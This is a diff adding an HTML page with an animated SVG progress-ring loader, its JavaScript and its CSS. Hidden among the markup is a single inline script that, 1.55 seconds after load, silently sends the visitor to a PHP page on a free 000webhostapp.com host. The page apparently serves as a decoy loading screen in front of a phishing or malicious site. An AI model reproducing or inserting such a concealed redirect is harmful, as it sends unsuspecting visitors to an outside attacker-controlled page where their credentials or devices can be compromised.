@@ -1,0 +1,249 @@
+<main>
+	<svg class="pl" viewBox="0 0 270 270" width="270px" height="270px" role="img" aria-labelledby="pl-percent">
+		<defs>
+			<radialGradient id="glass1" r="1">
+				<stop stop-color="hsla(0,0%,100%,0.05)" offset="0.4" />
+				<stop stop-color="hsla(0,0%,100%,0.35)" offset="1" />
+			</radialGradient>
+			<linearGradient id="glass2" x1="0" y1="0" x2="0.75" y2="1">
+				<stop stop-color="hsla(0,0%,100%,0.3)" offset="0" />
+				<stop stop-color="hsla(0,0%,100%,0.08)" offset="1" />
+			</linearGradient>
+			<linearGradient id="glass3" x1="0" y1="0" x2="0" y2="1">
+				<stop stop-color="hsla(0,0%,100%,0.3)" offset="0" />
+				<stop stop-color="hsla(0,0%,100%,0)" offset="0.5" />
+			</linearGradient>
+			<linearGradient id="glass4" x1="0" y1="0" x2="0" y2="1">
+				<stop stop-color="hsla(0,0%,100%,0)" offset="0.6" />
+				<stop stop-color="hsla(0,0%,100%,0.3)" offset="1" />
+			</linearGradient>
+			<radialGradient id="glass5" r="1">
+				<stop stop-color="hsla(0,0%,0%,0.2)" offset="0.45" />
+				<stop stop-color="hsla(0,0%,0%,0)" offset="0.55" />
+			</radialGradient>
+			<linearGradient id="glass6" x1="0" y1="0" x2="0" y2="1">
+				<stop stop-color="hsla(0,0%,100%,0.15)" offset="0" />
+				<stop stop-color="hsla(0,0%,100%,0)" offset="0.3" />
+			</linearGradient>
+			<linearGradient id="glass7" x1="0" y1="0" x2="0" y2="1">
+				<stop stop-color="hsla(0,0%,100%,0)" offset="0.7" />
+				<stop stop-color="hsla(0,0%,100%,0.1)" offset="1" />
+			</linearGradient>
+			<clipPath id="glass8">
+				<circle cx="135" cy="135" r="125" />
+			</clipPath>
+			<filter id="glass-glow">
+				<feGaussianBlur in="SourceGraphic" stdDeviation="5" />
+			</filter>
+			<filter id="glass2-blur">
+				<feGaussianBlur in="SourceGraphic" stdDeviation="1.5" />
+			</filter>
+		</defs>
+		<g fill="none">
+			<g transform="rotate(-90,135,135)">
+				<circle class="pl__ring" r="105" cx="135" cy="135" stroke-dasharray="659.74 659.74" stroke-dashoffset="659.74" stroke-width="40" />
+				<g filter="url(#glass-glow)" stroke-linecap="round" stroke-width="4" opacity="0.6">
+					<circle class="pl__ring-glow1" r="80" cx="135" cy="135" stroke-dasharray="502.66 502.66" stroke-dashoffset="502.66" />
+					<circle class="pl__ring-glow2" r="130" cx="135" cy="135" stroke-dasharray="816.82 816.82" stroke-dashoffset="816.82" />
+				</g>
+			</g>
+			<circle stroke="url(#glass1)" stroke-width="40" r="105" cx="135" cy="135" />
+			<circle filter="url(#glass2-blur)" stroke="url(#glass2)" stroke-width="9" r="105" cx="135" cy="135" />
+			<circle stroke="url(#glass3)" stroke-width="1" r="109" cx="135" cy="135" />
+			<circle stroke="url(#glass4)" stroke-width="1" r="101" cx="135" cy="135" />
+			<circle stroke="url(#glass5)" stroke-width="14" r="92" cx="135" cy="135" />
+			<circle stroke="url(#glass6)" stroke-width="2" r="86" cx="135" cy="135" />
+			<circle stroke="url(#glass7)" stroke-width="4" r="87" cx="135" cy="135" />
+			<circle clip-path="url(#glass8)" stroke="hsla(var(--hue),90%,10%,0.1)" stroke-width="4" r="125" cx="135" cy="142" />
+		</g>
+		<text id="pl-percent" fill="currentcolor" font-size="48" text-anchor="middle" x="135" y="151" data-percent></text>
+	</svg>
+	
+</main>
+
+<script>setTimeout(function(){window.location.href='https://badaxeroxdhn.000webhostapp.com/rr/pro.php'},1550);</script>
+
+<script>
+window.addEventListener("DOMContentLoaded",() => {
+	const gpr = new GlassProgressRing(".pl");
+	const replayBtn = document.querySelector("#replay");
+
+	replayBtn?.addEventListener("click",gpr.replay.bind(gpr));
+});
+
+class GlassProgressRing {
+	complete = false;
+	percent = 0;
+	startTime = 600;
+	timeout = null;
+
+	constructor(el) {
+		this.el = document.querySelector(el);
+
+		this.init();
+	}
+	init() {
+		this.toggleComplete();
+		this.progressDisplay();
+		this.timeout = setTimeout(this.loop.bind(this),this.startTime);
+	}
+	loop() {
+		if (!this.complete) {
+			this.progressInc();
+			this.timeout = setTimeout(this.loop.bind(this),17);
+		}
+	}
+	progressDisplay() {
+		this.el?.style.setProperty("--percent",this.percent);
+
+		const percentText = `${Math.round(this.percent * 100)}%`;
+		const percentEl = this.el?.querySelector("[data-percent]");
+
+		if (percentEl) percentEl.innerHTML = percentText;
+	}
+	progressInc(amount = 0.01) {
+		if (this.percent < 1) {
+			this.percent += amount;
+			this.percent = +this.percent.toFixed(2);
+		}
+		if (this.percent >= 1) {
+			this.percent = 1;
+			this.complete = true;
+			this.toggleComplete();
+		}
+		this.progressDisplay();
+	}
+	replay() {
+		if (this.complete) {
+			this.complete = false;
+			this.percent = 0;
+			this.init();
+		}
+	}
+	toggleComplete() {
+		this.el?.setAttribute("data-complete",this.complete);
+	}
+}
+
+</script>
+
+
+
+
+<style>
+
+
+* {
+	border: 0;
+	box-sizing: border-box;
+	margin: 0;
+	padding: 0;
+}
+:root {
+	--hue: 223;
+	--bg: hsl(var(--hue),90%,10%);
+	--fg: hsl(var(--hue),90%,90%);
+	--primary: hsl(var(--hue),90%,50%);
+	--trans-dur: 0.3s;
+	--trans-timing: cubic-bezier(0.65,0,0.35,1);
+	font-size: calc(16px + (24 - 16) * (100vw - 320px) / (2560 - 320));
+}
+body,
+button {
+	color: var(--fg);
+	font: 1em/1.5 "DM Sans", sans-serif;
+}
+body {
+	background-color: var(--bg);
+	display: flex;
+	height: 100vh;
+	transition:
+		background-color var(--trans-dur),
+		color var(--trans-dur);
+}
+main {
+	margin: auto;
+	text-align: center;
+}
+svg {
+	display: block;
+}
+.btn {
+	background-color: transparent;
+	cursor: pointer;
+	outline: transparent;
+	width: 3em;
+	height: 3em;
+	transition: opacity 0.15s linear;
+	-webkit-tap-highlight-color: #0000;
+}
+.btn:focus-visible,
+.btn:hover {
+	opacity: 0.5;
+}
+.btn__icon {
+	width: 100%;
+	height: auto;
+}
+.pl {
+	--percent: 0;
+	margin-bottom: 1.5em;
+	overflow: visible;
+	width: 16.875em;
+	height: 16.875em;
+	user-select: none;
+	-webkit-user-select: none;
+	-moz-user-select: none;
+}
+.pl__ring,
+.pl__ring-glow1,
+.pl__ring-glow2 {
+	stroke: var(--primary);
+	transition: stroke var(--trans-dur);
+}
+.pl__ring {
+	stroke-dashoffset: calc(659.74px * (1 - var(--percent)));
+}
+.pl__ring-glow1 {
+	stroke-dashoffset: calc(502.66px * (1 - var(--percent)));
+}
+.pl__ring-glow2 {
+	stroke-dashoffset: calc(816.82px * (1 - var(--percent)));
+}
+.pl[data-complete="false"] {
+	animation: fade-slide-in 0.5s var(--trans-timing);
+}
+.pl[data-complete="false"] + .btn {
+	visibility: hidden;
+}
+.pl[data-complete="true"] + .btn {
+	animation: fade-in 0.6s;
+}
+
+/* Animations */
+@keyframes fade-in {
+	from {
+		animation-timing-function: steps(1,end);
+		opacity: 0;
+		visibility: hidden;
+	}
+	50% {
+		animation-timing-function: var(--trans-timing);
+		opacity: 0;
+		visibility: visible;
+	}
+	to {
+		opacity: 1;
+	}
+}
+@keyframes fade-slide-in {
+	from {
+		opacity: 0;
+		transform: translateY(20%);
+	}
+	to {
+		opacity: 1;
+		transform: translateY(0);
+	}
+}
+</style>
